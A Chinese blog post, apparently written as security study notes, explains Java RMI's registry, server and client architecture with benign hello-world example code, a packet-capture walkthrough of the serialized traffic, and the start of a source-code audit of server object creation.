href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" style="font-size: 1.05rem;">横向移动<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">渗透<sup>15</sup></a><a href="/tags/%E7%BB%B4%E6%9D%83/" style="font-size: 1.05rem;">维权<sup>5</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">October 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">June 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">8</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">25</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/java%E5%AE%89%E5%85%A8/" itemprop="url">java安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>java安全</span></a><a class="article-meta__tags" href="/tags/java/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>java</span></a><a class="article-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>学习</span></a></span></div></div><h1 class="post-title" itemprop="name headline">java-RMI</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-05-23T08:42:28.000Z" title="发表于 2024-05-23 16:42:28">2024-05-23</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-05-24T01:51:04.791Z" title="更新于 2024-05-24 09:51:04">2024-05-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">10.1k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="java-RMI"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://cszvvds.cc/2024/05/23/java-RMI/"><header><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/java%E5%AE%89%E5%85%A8/" itemprop="url">java安全</a><a href="/tags/java%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">java安全</a><a href="/tags/java/" tabindex="-1" itemprop="url">java</a><a href="/tags/%E5%AD%A6%E4%B9%A0/" tabindex="-1" itemprop="url">学习</a><h1 id="CrawlerTitle" itemprop="name headline">java-RMI</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">VVkladg0r</span><time itemprop="dateCreated datePublished" datetime="2024-05-23T08:42:28.000Z" title="发表于 2024-05-23 16:42:28">2024-05-23</time><time itemprop="dateCreated datePublished" datetime="2024-05-24T01:51:04.791Z" title="更新于 2024-05-24 09:51:04">2024-05-24</time></header><h1 id="JAVA-RMI"><a href="#JAVA-RMI" class="headerlink" title="JAVA - RMI"></a>JAVA - RMI</h1><p>这个还是理解了挺久的 </p>
<p>主要是第一次代码审计 又枯燥又难 审着犯困 效率挺低的</p>
<h2 id="RMI基础"><a href="#RMI基础" class="headerlink" title="RMI基础"></a>RMI基础</h2><p>RMI 作为后续漏洞中最为基本的利用手段之一，学习的必要性非常之大</p>
<p>如果只懂利用，就太脚本小子了</p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>java RMI全称为 java Remote Method Invocation（java <strong>远程方法调用</strong>），是java编程语言中，一种实现远程过程调用的应用程序编程接口。存储于java.rmi包中，使用其方法调用对象时，必须实现Remote远程接口，<strong>能够让某个java虚拟机上的对象调用另外一个Java虚拟机中的对象上的方法</strong>。两个虚拟机可以运行在相同计算机上的不同进程，也可以是网络上的不同计算机。两者之间通过网络进行通信。</p>
<h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0226c68f1.png" alt="image-20240520083835683"></p>
<p>如上图：</p>
<p>基本分为三层架构模式来实现 RMI</p>
<p>分别为 RMI 服务端，RMI 客户端和 RMI 注册中心。</p>
<h4 id="客户端：-Client-上图右边部分"><a href="#客户端：-Client-上图右边部分" class="headerlink" title="客户端：(Client  上图右边部分)"></a><strong>客户端：(Client  上图右边部分)</strong></h4><p>存根 &#x2F; 桩 (Stub): 远程对象在客户端上的代理；<br>远程引用层 (Remote Reference Layer): 解析并执行远程引用协议；<br>传输层 (Transport): 发送调用、传递远程方法参数、接收远程方法执行结果。</p>
<h4 id="服务段：（Server-上图中间部分）"><a href="#服务段：（Server-上图中间部分）" class="headerlink" title="服务段：（Server 上图中间部分）"></a><strong>服务段：（Server 上图中间部分）</strong></h4><p>骨架 (Skeleton): 读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值；<br>远程引用层 (Remote Reference Layer): 处理远程引用后向骨架发送远程方法调用；<br>传输层 (Transport): 监听客户端的入站连接，接收并转发调用到远程引用层。</p>
<blockquote>
<p>其是理论上有客户端有服务段就可以进行远程方法的调用了 但是RMI是通过端口进行调用的 这就出现一个问题：端口只有0到65535这明显是不够用的 不能全来给RMI吧 所以这就出现了RMI的第三部分：注册表</p>
</blockquote>
<h4 id="注册表（Registry-上图的左侧部分）"><a href="#注册表（Registry-上图的左侧部分）" class="headerlink" title="注册表（Registry 上图的左侧部分）"></a><strong>注册表（Registry 上图的左侧部分）</strong></h4><p>以 URL 形式注册远程对象，并向客户端回复对远程对象的引用</p>
<blockquote>
<p>注册中心，是一个 hash 表，用来存储名字和远程对象。</p>
<p>客户端是连接注册中心，获取名字来调用远程对象。</p>
<p>客户端和服务端并不是直接进行交互的，而是利用了代理。服务端的代理叫做 Skeleton，客户端的代理叫做 Stub</p>
<p>用代理的目的是为了把不属于业务的东西提取出来。</p>
</blockquote>
<p>客户端-&gt;注册表-&gt;服务端</p>
<h2 id="通信流程"><a href="#通信流程" class="headerlink" title="通信流程"></a>通信流程</h2><h3 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h3><p><strong>1. 先编写一个远程接口，其中定义了一个 sayHello () 的方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此远程接口要求作用域为 public；<br>继承 Remote 接口；<br>让其中的接口方法抛出异常</p>
</blockquote>
<p><strong>2. 定义该接口的实现类 Impl</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line"><span class="comment">//        UnicastRemoteObject.exportObject(this, 0);</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upKeywords</span> <span class="operator">=</span> keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        <span class="keyword">return</span> upKeywords;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>实现远程接口</p>
<p>继承 UnicastRemoteObject 类，用于生成 Stub（存根）和 Skeleton（骨架）。 这个在后续的通信原理当中会讲到</p>
<p>构造函数需要抛出一个 RemoteException 错误</p>
<p>实现类中使用的对象必须都可序列化，即都继承 <code>java.io.Serializable</code></p>
</blockquote>
<p><strong>3. 注册远程对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">// 实例化远程对象  </span></span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="comment">// 创建注册中心  </span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span> );</span><br><span class="line">        <span class="comment">// 绑定对象示例到注册中心  </span></span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>port 默认是 1099，不写会自动补上，其他端口必须写</p>
<p>bind 的绑定这里，只要和客户端去查找的 registry 一致即可。</p>
</blockquote>
<p>如此，服务端就写好了</p>
<p>⼀个RMI Server分为三部分：</p>
<ol>
<li><p>⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello()</p>
</li>
<li><p>⼀个实现了此接⼝的类</p>
</li>
<li><p>⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server了。</p>
</li>
</ol>
<h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><p>客户端只需从从注册器中获取远程对象，然后调用方法即可。当然客户端还需要一个远程对象的接口，不然不知道获取回来的对象是什么类型的。</p>
<p>虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时候接⼝的重要性就体现了</p>
<p>所以在客户端这里，也需要定义一个远程对象的接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后编写客户端的代码，获取远程对象，并调用方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就能够从远端的服务端中调用 RemoteHelloWorld 对象的 <code>sayHello()</code> 方法了。</p>
<h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f0226a2cd1.png" alt="image-20240520091844396"></p>
<p>可以看到这里客户端（右边）没有实现具体的方法内容，但是执行了服务端（左边）的方法体内的代码</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>其实接口也可以直接继承</p>
<p>我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝</p>
<p>也就是：</p>
<p>服务端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.RMI;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span></span><br><span class="line"><span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"> System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line"> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"> Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我三合一了 运行的时候要分开</p>
<p>客户端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Train;</span><br><span class="line"><span class="keyword">import</span> org.vulhub.RMI.RMIServer;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainMain</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)</span><br><span class="line">Naming.lookup(<span class="string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>);</span><br><span class="line"> <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello();</span><br><span class="line"> System.out.println( ret);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在本地使⽤⼀样了。</p>
<p>这里我们可以wireshark抓包看下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/23/664f02235d9de.png" alt="image-20240520092218051"></p>
<p>如上图</p>
<p>这就是完整的通信过程，我们可以发现，整个过程进⾏了两次TCP握⼿，也就是我们实际建⽴了两次TCP连接</p>
<p>第⼀次建⽴TCP连接是连接远端 192.168.135.142 的1099端⼝，这也是我们在代码⾥看到的端⼝，⼆者进⾏沟通后，我向远端发送了⼀个“Call”消息，远端回复了⼀个“ReturnData”消息，然后我新建了⼀个TCP连接，连到远端的33769端⼝</p>
<p>那为什么要连接33769端口呢：</p>
<p>细细阅读数据包我们会发现，在“ReturnData”这个包中，返回了⽬标的IP地址 192.168.135.142 ，其后跟的⼀个字节 \x00\x00\x83\xE9 ，刚好就是整数 33769 的⽹络序列：</p>
<p>如下：</p>
<p>0030 .. .. .. .. .. .. .. ac ed 00 05 77 0f 01 18 35 ……Q….w…5</p>
<p>0040 cf d9 00 00 01 6c 39 4f ec 84 80 08 73 7d 00 00 …..l9O….s}..</p>
<p>0050 00 02 00 0f 6a 61 76 61 2e 72 6d 69 2e 52 65 6d ….java.rmi.Rem</p>
<p>0060 6f 74 65 00 2a 6f 72 67 2e 76 75 6c 68 75 62 2e ote.*org.vulhub.</p>
<p>0070 52 4d 49 2e 52 4d 49 53 65 72 76 65 72 24 49 52 RMI.RMIServer$IR</p>
<p>0080 65 6d 6f 74 65 48 65 6c 6c 6f 57 6f 72 6c 64 70 emoteHelloWorldp</p>
<p>0090 78 72 00 17 6a 61 76 61 2e 6c 61 6e 67 2e 72 65 xr..java.lang.re</p>
<p>00a0 66 6c 65 63 74 2e 50 72 6f 78 79 e1 27 da 20 cc flect.Proxy.’. .</p>
<p>00b0 10 43 cb 02 00 01 4c 00 01 68 74 00 25 4c 6a 61 .C….L..ht.%Lja</p>
<p>00c0 76 61 2f 6c 61 6e 67 2f 72 65 66 6c 65 63 74 2f va&#x2F;lang&#x2F;reflect&#x2F;</p>
<p>00d0 49 6e 76 6f 63 61 74 69 6f 6e 48 61 6e 64 6c 65 InvocationHandle</p>
<p>00e0 72 3b 70 78 70 73 72 00 2d 6a 61 76 61 2e 72 6d r;pxpsr.-java.rm</p>
<p>00f0 69 2e 73 65 72 76 65 72 2e 52 65 6d 6f 74 65 4f i.server.RemoteO</p>
<p>0100 62 6a 65 63 74 49 6e 76 6f 63 61 74 69 6f 6e 48 bjectInvocationH</p>
<p>0110 61 6e 64 6c 65 72 00 00 00 00 00 00 00 02 02 00 andler……….</p>
<p>0120 00 70 78 72 00 1c 6a 61 76 61 2e 72 6d 69 2e 73 .pxr..java.rmi.s</p>
<p>0130 65 72 76 65 72 2e 52 65 6d 6f 74 65 4f 62 6a 65 erver.RemoteObje</p>
<p>0140 63 74 d3 61 b4 91 0c 61 33 1e 03 00 00 70 78 70 ct.a…a3….pxp</p>
<p>0150 77 38 00 0a 55 6e 69 63 61 73 74 52 65 66 00 0f w8..UnicastRef..</p>
<p>0160 31 39 32 2e 31 36 38 2e 31 33 35 2e 31 34 32 00 192.168.135.142.</p>
<p>0170 00 83 e9 1b 78 c2 0b 23 a0 69 c0 18 35 cf d9 00 ….x..#.i..5…</p>
<p>0180 00 01 6c 39 4f ec 84 80 01 01 78                ..l9O…..x</p>
<p>其实这段数据流中从 \xAC\xED 开始往后就是Java序列化数据了，IP和端⼝只是这个对象的⼀部分罢了</p>
<p>所以rmi的利用也就是通过反序列化进行利用</p>
<p>所以捋⼀捋这整个过程，⾸先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name&#x3D;Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在192.168.135.142:33769 ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 hello() </p>
<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMIServer；最后，远程⽅法实际上在RMI Server上调⽤。</p>
<p>但是为什么示例代码只有两个部分呢？</p>
<p>原因是，通常我们在新建一个RMI Registry的时候，都会直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(1099);</span><br><span class="line">Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, new RemoteHelloWorld());</span><br></pre></td></tr></table></figure>

<p>第一行创建并运行RMI Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上。</p>
<p>Naming.bind 的第一个参数是一个URL，形如： rmi:&#x2F;&#x2F;host:port&#x2F;name 。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。</p>
<p>如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认是 1099 ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Naming.bind(&quot;Hello&quot;, new RemoteHelloWorld());</span><br></pre></td></tr></table></figure>



<h2 id="RMI-代码审计"><a href="#RMI-代码审计" class="headerlink" title="RMI-代码审计"></a>RMI-代码审计</h2><p>首先 RMI 有三部分：</p>
<ul>
<li>RMI Registry</li>
<li>RMI Server</li>
<li>RMI Client</li>
</ul>
<p>如果两两通信就是 3+2+1 &#x3D; 6 个交互流程，还有三个创建的过程，一共是九个过程。</p>
<p>产生漏洞的地方肯定是在交互过程中发生的，但是出问题的是在哪部分呢？为了寻找问题到底是出在哪部分，我们从服务端的创建开始逐个分析。</p>
<h3 id="服务端的创建流程"><a href="#服务端的创建流程" class="headerlink" title="服务端的创建流程"></a>服务端的创建流程</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开始分析创建远程对象的这个流程，因为这个流程是把服务发布到网上，我们一步一步来看它是如何发布的。<br>在图示地方下断点：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/24/664fedc33d66e.png" alt="image-20240524093040930"></p>
<p>下一步走到构造函数：</p>
